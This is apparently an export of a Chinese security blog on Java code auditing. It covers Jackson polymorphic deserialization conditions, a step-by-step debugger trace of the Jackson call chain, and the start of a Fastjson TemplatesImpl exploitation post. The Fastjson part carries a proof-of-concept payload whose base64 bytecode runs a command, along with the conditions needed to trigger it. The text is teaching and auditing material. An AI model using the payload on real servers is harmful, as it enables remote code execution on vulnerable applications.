class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果:object属性中多了”@c”:”xxxxxxxxxxx.Hacker”，即使用@c替代料@class，官方描述中的意思是缩短了相关类名，实际效果和JsonTypeInfo.Id.CLASS类似</p><pre><code>{&quot;age&quot;:6,&quot;name&quot;:&quot;mi1k7ea&quot;,&quot;object&quot;:{&quot;@c&quot;:&quot;com.DemoJackson.Study.DemoJsonTypeInfo.Demo3MinimalClass.Hacker&quot;,&quot;skill&quot;:&quot;Jackson&quot;}}Person.age=6, Person.name=mi1k7ea, com.DemoJackson.Study.DemoJsonTypeInfo.Demo3MinimalClass.Hacker@204f30ec</code></pre><p><img src="/img/JacksonDeserialization/image-20211029191055855.png" alt="image-20211029191055855"></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>满足下面三个条件之一即存在Jackson反序列化漏洞：</p><ul><li>调用了ObjectMapper.enableDefaultTyping()函数；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解；</li></ul><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><code>https://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86</code></p>]]></content>
      
      
      <categories>
          
          <category> Java代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java代码审计之Jackson序列化和反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计之Jackson反序列化调用链完整分析过程</title>
      <link href="/2021/10/29/java-dai-ma-shen-ji-zhi-jackson-fan-xu-lie-hua-diao-yong-lian-wan-zheng-fen-xi-guo-cheng/"/>
      <url>/2021/10/29/java-dai-ma-shen-ji-zhi-jackson-fan-xu-lie-hua-diao-yong-lian-wan-zheng-fen-xi-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Jackson反序列化调用链完整分析过程"><a href="#Jackson反序列化调用链完整分析过程" class="headerlink" title="Jackson反序列化调用链完整分析过程"></a>Jackson反序列化调用链完整分析过程</h1><h2 id="调试代码"><a href="#调试代码" class="headerlink" title="调试代码"></a>调试代码</h2><p>JSTest.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoJackson<span class="token punctuation">.</span>Study<span class="token punctuation">.</span>DemoDefaultTyping<span class="token punctuation">.</span>Demo5Serialized<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ObjectMapper<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JSTest</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        ObjectMapper mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String json <span class="token operator">=</span> <span class="token string">"{\"age\":6,\"name\":\"mi1k7ea\",\"sex\":[\"com.DemoJackson.Study.DemoDefaultTyping.Demo5Serialized.MySex\",{\"sex\":1}]}"</span><span class="token punctuation">;</span>        Person p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> Person<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Person.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoJackson<span class="token punctuation">.</span>Study<span class="token punctuation">.</span>DemoDefaultTyping<span class="token punctuation">.</span>Demo5Serialized<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> String name<span class="token punctuation">;</span>    <span class="token keyword">public</span> Sex sex<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Person构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> sex <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Sex.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoJackson<span class="token punctuation">.</span>Study<span class="token punctuation">.</span>DemoDefaultTyping<span class="token punctuation">.</span>Demo5Serialized<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Sex</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSex</span><span class="token punctuation">(</span><span class="token keyword">int</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>MySex.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoJackson<span class="token punctuation">.</span>Study<span class="token punctuation">.</span>DemoDefaultTyping<span class="token punctuation">.</span>Demo5Serialized<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySex</span> <span class="token keyword">implements</span> <span class="token class-name">Sex</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> sex<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">MySex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MySex构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MySex.getSex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSex</span><span class="token punctuation">(</span><span class="token keyword">int</span> sex<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MySex.setSex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>以enableDefaultTyping反序列化为demo分析</p><p>在反序列化处断点</p><p><img src="/img/JacksonDeserializationAnalyse/image-20211029154323993.png" alt="image-20211029154323993"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/ObjectMapper.classObjectMapper#_readMapAndClose</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029154426911.png" alt="image-20211029154426911"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/deser/BeanDeserializer.classBeanDeserializer#deserialize</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029154511992.png" alt="image-20211029154511992"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/deser/BeanDeserializer.class这个方法比较核心BeanDeserializer#vanillaDeserialize先进入到Object bean = this._valueInstantiator.createUsingDefault(ctxt);</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029154710682.png" alt="image-20211029154710682"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/deser/std/StdValueInstantiator.class_valueInstantiator#createUsingDefault进入_defaultCreator.call()</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029154806063.png" alt="image-20211029154806063"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/introspect/AnnotatedConstructor.classAnnotatedConstructor#call</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029154916853.png" alt="image-20211029154916853"></p><p>进入到了要反序列化类的构造函数里</p><p><img src="/img/JacksonDeserializationAnalyse/image-20211029154942430.png" alt="image-20211029154942430"></p><p>回到</p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/deser/BeanDeserializer.classBeanDeserializer#vanillaDeserialize可以看到bean对象是Person类了do while 循环，反序列化和赋值Person类的每个属性进入到prop.deserializeAndSet(p, ctxt, bean)</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029155101807.png" alt="image-20211029155101807"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/deser/impl/FieldProperty.classFieldProperty#deserializeAndSet分别是反序列化和赋值先进入Object value = this.deserialize(p, ctxt)</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029155205817.png" alt="image-20211029155205817"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/deser/SettableBeanProperty.classSettableBeanProperty#deserializethis._valueTypeDeserializer != null ? this._valueDeserializer.deserializeWithType(p, ctxt, this._valueTypeDeserializer) : this._valueDeserializer.deserialize(p, ctxt);因为this._valueTypeDeserializer为null，所以进入this._valueDeserializer.deserialize(p, ctxt)</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029155355533.png" alt="image-20211029155355533"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/deser/std/NumberDeserializers.classNumberDeserializers#deserialize进入p.getIntValue()</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029155444627.png" alt="image-20211029155444627"></p><pre><code>com/fasterxml/jackson/core/jackson-core/2.7.9/jackson-core-2.7.9.jar!/com/fasterxml/jackson/core/base/ParserBase.classParserBase#getIntValue进入this._parseIntValue();</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029155530069.png" alt="image-20211029155530069"></p><pre><code>com/fasterxml/jackson/core/jackson-core/2.7.9/jackson-core-2.7.9.jar!/com/fasterxml/jackson/core/base/ParserBase.classParserBase#_parseIntValue在这个方法里获取到了age的值</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029155703399.png" alt="image-20211029155703399"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/deser/impl/FieldProperty.class回到FieldProperty#deserializeAndSet可以看到value的值为6进入到this._field.set(instance, value);给实例的属性赋值</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029155752221.png" alt="image-20211029155752221"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/deser/BeanDeserializer.class回到BeanDeserializer#vanillaDeserialize同理给name属性赋值</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029160826025.png" alt="image-20211029160826025"></p><p>可以看到age和name属性都已经赋值了，接下来给MySex类反序列化和赋值</p><p><img src="/img/JacksonDeserializationAnalyse/image-20211029160924437.png" alt="image-20211029160924437"></p><p>进入到</p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/deser/SettableBeanProperty.classSettableBeanProperty#deserialize因为Sex属性的值是MySex类，所以进入到this._valueDeserializer.deserializeWithType</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029161104928.png" alt="image-20211029161104928"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/deser/AbstractDeserializer.classAbstractDeserializer#deserializeWithType进入到typeDeserializer.deserializeTypedFromObject(p, ctxt)</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029161250447.png" alt="image-20211029161250447"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/jsontype/impl/AsArrayTypeDeserializer.classAsArrayTypeDeserializer#_deserialize进入到this._locateTypeId((JsonParser)p, ctxt);</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029161411386.png" alt="image-20211029161411386"></p><p>_locateTypeId方法获取到MySex类</p><p><img src="/img/JacksonDeserializationAnalyse/image-20211029161450281.png" alt="image-20211029161450281"></p><p>回到AsArrayTypeDeserializer#_deserialize</p><p>进入Object value = deser.deserialize((JsonParser)p, ctxt);</p><p><img src="/img/JacksonDeserializationAnalyse/image-20211029162436250.png" alt="image-20211029162436250"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/deser/BeanDeserializer.classBeanDeserializer#deserialize</code></pre><p>这里很熟悉了，和之前实例化Person一样，现在实例化MySex类</p><p><img src="/img/JacksonDeserializationAnalyse/image-20211029162521878.png" alt="image-20211029162521878"></p><p><img src="/img/JacksonDeserializationAnalyse/image-20211029162712126.png" alt="image-20211029162712126"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/deser/BeanDeserializer.classBeanDeserializer#vanillaDeserialize对MySex类的属性赋值，也就是对sex属性赋值</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029162828435.png" alt="image-20211029162828435"></p><pre><code>com/fasterxml/jackson/core/jackson-databind/2.7.9/jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/deser/impl/MethodProperty.classMethodProperty#deserializeAndSet进入到this._setter.invoke(instance, value);</code></pre><p><img src="/img/JacksonDeserializationAnalyse/image-20211029162936457.png" alt="image-20211029162936457"></p><p>最后跳转到MySex类的setSex方法，即就是通过setter方法去赋值的。</p><p><img src="/img/JacksonDeserializationAnalyse/image-20211029163007378.png" alt="image-20211029163007378"></p><p>至此Jackson的反序列化调用链分析完~</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>在Jackson反序列化中，若调用了enableDefaultTyping()函数或使用@JsonTypeInfo注解指定反序列化得到的类的属性为JsonTypeInfo.Id.CLASS或JsonTypeInfo.Id.MINIMAL_CLASS，则会调用该属性的类的构造函数和setter方法。</p><p>满足下面三个条件之一即存在Jackson反序列化漏洞：</p><ul><li>调用了ObjectMapper.enableDefaultTyping()函数；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解；</li></ul><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>当使用的JacksonPolymorphicDeserialization机制配置有问题时，Jackson反序列化就会调用属性所属类的构造函数和setter方法。那么我们只要传递进去的类的setter方法里放入执行命令的代码即可触发反序列化漏洞。类似于fastjson~</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><code>https://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86</code></p>]]></content>
      
      
      <categories>
          
          <category> Java代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java代码审计之Jackson反序列化调用链完整分析过程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计之Fastjson反序列化调用链完整分析过程</title>
      <link href="/2021/10/28/java-dai-ma-shen-ji-zhi-fastjson-fan-xu-lie-hua-diao-yong-lian-wan-zheng-fen-xi-guo-cheng/"/>
      <url>/2021/10/28/java-dai-ma-shen-ji-zhi-fastjson-fan-xu-lie-hua-diao-yong-lian-wan-zheng-fen-xi-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Fastjson反序列化调用链完整分析过程"><a href="#Fastjson反序列化调用链完整分析过程" class="headerlink" title="Fastjson反序列化调用链完整分析过程"></a>Fastjson反序列化调用链完整分析过程</h1><h2 id="0x01-TemplatesImpl利用链分析"><a href="#0x01-TemplatesImpl利用链分析" class="headerlink" title="0x01.TemplatesImpl利用链分析"></a>0x01.TemplatesImpl利用链分析</h2><h3 id="1-为什么会触发？"><a href="#1-为什么会触发？" class="headerlink" title="1.为什么会触发？"></a>1.为什么会触发？</h3><p><strong>fastjson反序列化会返回TemplatesImpl对象，并且自动调用TemplatesImpl类的属性对应的set和get方法。而TemplatesImpl类的_outputProperties属性的getter方法（getOutputProperties）符合fastjson反序列化时调用的条件，那么就会执行TemplatesImpl#getOutputProperties，而getOutputProperties里调用了<code>newTransformer()</code>。从而执行了<code>_bytecodes</code>的值转换出来的类里的静态方法或者构造方法里的代码。为什么会执行，详细分析过程见《Java动态加载字节码》的”Gadgets 7u21 调试过程 - TemplatesImpl触发原理”。</strong></p><h3 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><p>Fastjson中使用<code>TemplatesImpl</code>链的条件比较苛刻，</p><ol><li>服务端使用parseObject()时，必须使用如下格式才能触发漏洞：<br><code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</code></li><li>服务端使用parse()时，需要<code>JSON.parse(text1,Feature.SupportNonPublicField);</code></li></ol><p>加入<code>Feature.SupportNonPublicField</code>才能触发是因为<code>Feature.SupportNonPublicField</code>的作用是支持反序列化使用非public修饰符保护的属性，在Fastjson中序列化private属性。</p><h3 id="3-Payload"><a href="#3-Payload" class="headerlink" title="3.Payload"></a>3.Payload</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoFastjson<span class="token punctuation">.</span>DemoTemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>Feature<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>ParserConfig<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoTemplatesImpl</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ParserConfig config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ParserConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String text <span class="token operator">=</span> <span class="token string">"{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66v......AAAAIAIA==\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }}"</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> config<span class="token punctuation">,</span> Feature<span class="token punctuation">.</span>SupportNonPublicField<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析fastjson反序列化使用TemplatesImpl利用链的POC，发现有些许不一样的地方</p><ol><li><p>为什么<code>_tfactory</code>是一个空的对象，而不是一个拥有getExternalExtensionsMap的类？</p><p>会发现当赋值的值为一个空的Object对象时，会新建一个需要赋值的字段应有的格式的新对象实例。</p></li><li><p>_bytecodes为什么是base64编码，而不是字节码？</p><p>fastjson内部做了base64解码</p></li><li><p>我们要调用TemplatesImple类的getOutputProperties方法，但是为什么是<code>_outputProperties</code>字段，多了一个<code>_</code>？</p><p>好像不是必须的，即使有_,也会在代码里替换成空</p></li></ol><h2 id="0x02-Fastjson反序列化的调用过程"><a href="#0x02-Fastjson反序列化的调用过程" class="headerlink" title="0x02. Fastjson反序列化的调用过程"></a>0x02. Fastjson反序列化的调用过程</h2><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// fastjson反序列化（1.2.22-1.2.24），通过TemplatesImpl触发</span><span class="token comment" spellcheck="true">// 分析文章：https://www.cnblogs.com/nice0e3/p/14601670.html</span><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoFastjson<span class="token punctuation">.</span>DemoTemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>Feature<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>ParserConfig<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoTemplatesImpl</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ParserConfig config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ParserConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String text <span class="token operator">=</span> <span class="token string">"{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJkxjb20vRGVtb1RlbXBsYXRlc0ltcGwvRGVtb0hlbGxvV29ybGQ7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcALgEAClNvdXJjZUZpbGUBABNEZW1vSGVsbG9Xb3JsZC5qYXZhDAAcAB0HAC8MADAAMQEAC0hlbGxvIFdvcmxkBwAyDAAzADQHADUMADYANwEAPS9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwL0NvbnRlbnRzL01hY09TL0NhbGN1bGF0b3IMADgAOQEAJGNvbS9EZW1vVGVtcGxhdGVzSW1wbC9EZW1vSGVsbG9Xb3JsZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAgACQAAAAAAAwABAAoACwACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAADQAOAAAAIAADAAAAAQAPABAAAAAAAAEAEQASAAEAAAABABMAFAACABUAAAAEAAEAFgABAAoAFwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAADwAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEQASAAEAAAABABgAGQACAAAAAQAaABsAAwAVAAAABAABABYAAQAcAB0AAgAMAAAATAACAAEAAAAWKrcAAbIAAhIDtgAEuAAFEga2AAdXsQAAAAIADQAAABIABAAAABEABAASAAwAEwAVABUADgAAAAwAAQAAABYADwAQAAAAFQAAAAQAAQAeA